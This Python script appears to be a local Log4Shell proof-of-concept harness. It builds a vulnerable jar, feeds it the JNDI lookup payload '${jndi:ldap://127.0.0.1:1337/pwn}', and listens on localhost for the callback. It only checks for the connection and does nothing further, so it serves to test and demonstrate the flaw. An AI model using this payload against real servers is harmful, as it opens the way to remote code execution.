from pathlib import Path
from shutil import which
import socket
import sys
import subprocess
import time

APP_DIR = Path(__file__).parent.resolve()

MAKE_PATH = which("make")

if MAKE_PATH is None:
    sys.stderr.write("`make` must be installed and in your PATH\n")
    exit(1)

# Make sure the jar file for the vulnerable program is built:
subprocess.check_call([MAKE_PATH, "-C", APP_DIR, "log4shell-poc.jar"])

sock = socket.socket()
sock.bind(('0.0.0.0', 1337))
sock.listen(1)
sock.setblocking(False)

payload = "${jndi:ldap://127.0.0.1:1337/pwn}"

print(f"Local log4j payload: \"{payload}\"")
print("Listening for log4j callbacks on port 1337...")

# trigger the payload:
p = subprocess.Popen([MAKE_PATH, "-C", APP_DIR, "log4shell-poc.jar", "run"],
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL)

while True:
    try:
        conn, addr = sock.accept()
        print(f"Got a connection: {addr}\nThe exploit appears to have worked!")
        conn.close()
        retcode = p.poll()
        if retcode is None or retcode == 0:
            print("Success!")
        else:
            print(f"However, the target exited with code {retcode}")
        exit()
    except BlockingIOError:
        pass
    try:
        retcode = p.wait(timeout=0.2)
        # we did not get a connection!
        print(f"Target exited with code {retcode} before the exploit was successful")
        exit(1)
    except subprocess.TimeoutExpired:
        pass
